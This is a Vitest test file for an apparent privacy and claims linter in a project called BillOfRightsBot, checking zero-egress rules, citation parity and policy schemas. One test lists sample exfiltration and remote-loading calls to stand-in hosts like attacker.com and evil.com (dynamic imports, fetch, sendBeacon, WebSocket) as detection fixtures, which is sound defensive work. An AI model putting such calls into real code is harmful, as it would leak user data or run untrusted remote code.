import { describe, it, expect } from 'vitest';
import {
  auditZeroEgress,
  auditStatutoryParity,
  auditVocabulary,
  auditPolicyPacks,
  auditPortfolioMasterBrief,
  testNetworkPrimitive,
  scanSourceForNetworkPrimitives,
  stripLineComment,
// @ts-expect-error - ESM audit script without bundled declaration
} from '../../scripts/audit-claims.mjs';

describe('BillOfRightsBot Claims & Privacy Invariant Linter (claims-linter.test.ts)', () => {
  it('enforces zero remote egress and strict loopback-only CSP invariant', () => {
    const errors: string[] = [];
    auditZeroEgress(errors);
    expect(errors).toEqual([]);
  });

  it('verifies detection of all synthetic egress mutation vectors and string-aware comment stripping', () => {
    // 1. Remote dynamic imports containing // protocols
    expect(testNetworkPrimitive("import('https://attacker.com/evil.js')")).toBe(true);
    expect(testNetworkPrimitive("import(`https://attacker.com/evil.js`)")).toBe(true);
    expect(testNetworkPrimitive("import('http://attacker.com/evil.js')")).toBe(true);

    // 2. Remote Workers containing // protocols
    expect(testNetworkPrimitive("new Worker('https://attacker.com/worker.js')")).toBe(true);
    expect(testNetworkPrimitive("new Worker(new URL('https://attacker.com/worker.js'))")).toBe(true);
    expect(testNetworkPrimitive("const w = new Worker('http://attacker.com/worker.js'); // spawn")).toBe(true);

    // 3. Standard fetch, aliasing, and DOM injection vectors
    expect(testNetworkPrimitive("fetch('https://telemetry.evil.com/leak')")).toBe(true);
    expect(testNetworkPrimitive("const f = fetch; // alias assignment")).toBe(true);
    expect(testNetworkPrimitive("const img = new Image();")).toBe(true);
    expect(testNetworkPrimitive("document.createElement('script')")).toBe(true);
    expect(testNetworkPrimitive("document['createElement']('script')")).toBe(true);
    expect(testNetworkPrimitive("navigator.sendBeacon('https://evil.com/beacon')")).toBe(true);
    expect(testNetworkPrimitive("navigator['sendBeacon']('https://evil.com')")).toBe(true);
    expect(testNetworkPrimitive("new WebSocket('wss://evil.com/socket')")).toBe(true);
    expect(testNetworkPrimitive("new EventSource('https://evil.com/stream')")).toBe(true);
    expect(testNetworkPrimitive("window.fetch('https://evil.com')")).toBe(true);

    // 4. Benign comments and local operations
    expect(testNetworkPrimitive("// import('https://attacker.com/evil.js')")).toBe(false);
    expect(testNetworkPrimitive("const a = 1; // new Worker('https://attacker.com')")).toBe(false);
    expect(testNetworkPrimitive("new Worker(new URL('./local-worker.ts', import.meta.url))")).toBe(false);
    expect(testNetworkPrimitive("document.createElement('iframe')")).toBe(false);
    expect(testNetworkPrimitive("document.createElement('div')")).toBe(false);

    // 5. Multi-line scanning and block comment preservation
    const benignSource = `
      // Regular comment
      const a = 1;
      /*
        import('https://evil.com')
        new Worker('https://evil.com')
      */
      const b = 2;
    `;
    expect(scanSourceForNetworkPrimitives(benignSource, 'test.ts')).toEqual([]);

    const maliciousSource = `
      const a = 1;
      import('https://attacker.com/payload.js');
      const b = 2;
    `;
    const errs = scanSourceForNetworkPrimitives(maliciousSource, 'test.ts');
    expect(errs.length).toBe(1);
    expect(errs[0]).toContain('test.ts:3');
  });

  it('enforces statutory citation parity between README and policy engines', () => {
    const errors: string[] = [];
    auditStatutoryParity(errors);
    expect(errors).toEqual([]);
  });

  it('prohibits unprovable marketing adjectives across documentation and UI', () => {
    const errors: string[] = [];
    auditVocabulary(errors);
    expect(errors).toEqual([]);
  });

  it('validates schema conformance across all 6 statutory subscription policy packs', () => {
    const errors: string[] = [];
    auditPolicyPacks(errors);
    expect(errors).toEqual([]);
  });

  it('verifies Portfolio Master Brief parity if brief is present', () => {
    const errors: string[] = [];
    auditPortfolioMasterBrief(errors, { requireBrief: false });
    expect(errors).toEqual([]);
  });

  it('fails if Portfolio Master Brief is required but missing', () => {
    const errors: string[] = [];
    auditPortfolioMasterBrief(errors, {
      requireBrief: true,
      overrideBriefPath: '/non-existent/path/BRIEF.md',
    });
    expect(errors.length).toBeGreaterThan(0);
    expect(errors[0]).toContain('not found but required via --require-brief');
  });
});
